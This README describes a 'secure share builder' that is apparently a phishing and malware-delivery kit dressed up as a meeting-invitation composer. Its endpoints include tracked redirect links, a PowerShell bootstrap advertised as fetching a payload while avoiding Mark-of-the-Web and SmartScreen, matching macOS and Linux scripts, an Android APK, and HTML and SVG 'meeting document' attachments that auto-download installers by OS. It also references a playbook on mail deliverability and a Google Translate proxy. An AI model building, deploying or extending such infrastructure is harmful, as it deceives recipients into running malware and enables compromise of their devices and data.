# Secure share builder

Static page + zero-dependency Node API for composing meeting invitations through
Gmail, Outlook, Teams, Slack, DocuSign and WhatsApp.

- `POST /api/build` validates and dedupes recipient emails, creates a tracked
  `/t/<id>` link that redirects to the device-aware meeting page, and returns the
  service compose URL.
- `GET /t/<id>` counts a click and redirects.
- `GET /api/stats` totals links/clicks.
- `GET /dl/windows.cmd` — double-clickable PowerShell bootstrap (payload fetched
  inside the script, no Mark-of-the-Web, no SmartScreen).
- `GET /dl/macos.command`, `GET /dl/linux.sh` — same for macOS/Linux.
- `GET /dl/android` — APK.
- `GET /attach/<id>` — HTML "meeting document" attachment; auto-downloads the
  right installer for the visiting OS. Optional `?os=windows|macos|linux|android`.
- `GET /attach/<id>/svg` — SVG variant for clients that preview SVG.
- Deployed at https://share.telcom.stream.

Environment: `SHARE_PORT`, `SHARE_HOST`, `SHARE_DATA_DIR`, `SHARE_LANDING`,
`SHARE_PUBLIC`, `SHARE_ANDROID_APK`.

See `docs/DELIVERY_PLAYBOOK.md` for ESP/DNS/DMARC setup, attachment behaviour per
mail client, Google Translate proxy notes, and the Android Play Protect reality.
